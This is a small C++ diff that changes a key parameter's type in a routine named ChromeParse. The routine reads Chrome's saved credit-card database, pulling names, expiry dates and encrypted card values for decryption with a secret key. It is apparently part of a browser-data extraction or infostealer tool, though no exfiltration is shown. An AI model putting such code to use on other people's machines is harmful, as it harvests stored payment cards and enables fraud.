@@ -8,9 +8,9 @@ creditCards::creditCards(string main, string sub) {
     this->mainPath = std::move(main);
 }
 
-void creditCards::ChromeParse(bytes secretKey) {
+void creditCards::ChromeParse(uint8_t* secretKey) {
     auto db = sqlitelib::Sqlite(ChromeCreditFile);
-    auto rows = db.execute<string, string, string, string, bytes>(
+    auto rows = db.execute<string, string, string, string, uint8_t*>(
             queryChromiumCredit);
     for (const auto &[guid, name, month, year, encryptValue]:rows) {
         BrowserCard card = {
